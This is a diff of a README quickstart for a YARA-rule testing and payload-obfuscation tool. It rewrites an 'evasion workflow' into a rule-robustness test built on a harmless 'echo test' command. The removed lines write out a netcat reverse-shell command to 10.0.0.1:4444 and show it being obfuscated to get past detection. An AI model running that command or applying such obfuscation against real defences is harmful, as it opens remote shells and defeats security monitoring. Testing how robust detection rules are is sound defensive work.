@@ -71,27 +71,27 @@ pip install -e .
 
 ---
 
-## Quickstart: The Evasion Workflow
+## Quickstart: Rule Robustness Testing
 
-Here is a common scenario: testing whether obfuscating a reverse shell bypasses basic detection.
+This example checks whether a YARA rule depends on the exact string form of a sample. It uses a harmless test command.
 
-### 1. Test your raw payload
+### 1. Establish a baseline.
 
-Scan a raw payload against your YARA rules directory:
-
-```bash
-encobu test -P "nc -e /bin/sh 10.0.0.1 4444" -r rules/
-```
-
-### 2. Obfuscate the payload
-
-Take the same command and run it through Escape Sequence Obfuscation:
+Scan a raw payload against your rules:
 
 ```bash
-encobu obfus -P "nc -e /bin/sh 10.0.0.1 4444" -a eso > payload_eso.txt
+encobu test -P "echo test" -r rules/
 ```
 
-### 3. Test the obfuscated payload
+### 2. Apply a transform.
+
+Encode or obfuscate the payload:
+
+```bash
+encobu obfus -P "echo test" -a eso > payload_eso.txt
+```
+
+### 3. Test the transformed payload
 
 ```bash
 encobu test -F payload_eso.txt -r rules/
@@ -102,7 +102,7 @@ _Output: Results are saved to_
 
 ### 4. Compare the results
 
-Generate a comparison report between both runs:
+The report shows which rules matched the baseline but not the transformed sample. Those rules depend on exact string patterns and may need broader signatures.
 
 ```bash
 encobu report -o test_results/inline_<hash>_results.json -m test_results/payload_eso_results.json
